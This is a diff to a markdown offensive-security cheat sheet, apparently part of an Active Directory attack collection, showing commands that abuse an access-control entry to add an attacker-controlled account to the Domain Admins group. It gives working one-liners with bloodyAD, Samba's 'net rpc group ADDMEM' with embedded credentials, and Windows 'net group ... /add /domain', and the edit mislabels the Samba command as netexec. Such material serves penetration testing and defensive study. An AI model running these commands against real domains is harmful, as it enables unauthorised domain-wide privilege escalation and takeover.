@@ -165,23 +165,19 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
 
 This ACE allows us to add ourselves to the Domain Admin group :
 
-* Windows/Linux:
-
-  ```ps1
+#### From Linux:
+* **Using BloodyAD**  
+  ```bash
   bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 add groupMember 'Domain Admins' hacker
   ```
-
-* Windows only:
+* **Using netexec**  
+```bash
+  net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]
+  ```
+#### From Windows:
 
   ```ps1
   net group "domain admins" hacker /add /domain
-  ```
-
-* Linux only:
-
-  ```ps1
-  # Using the Samba software suite
-  net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]
   ```
 
 ### GenericWrite and Remote Connection Manager
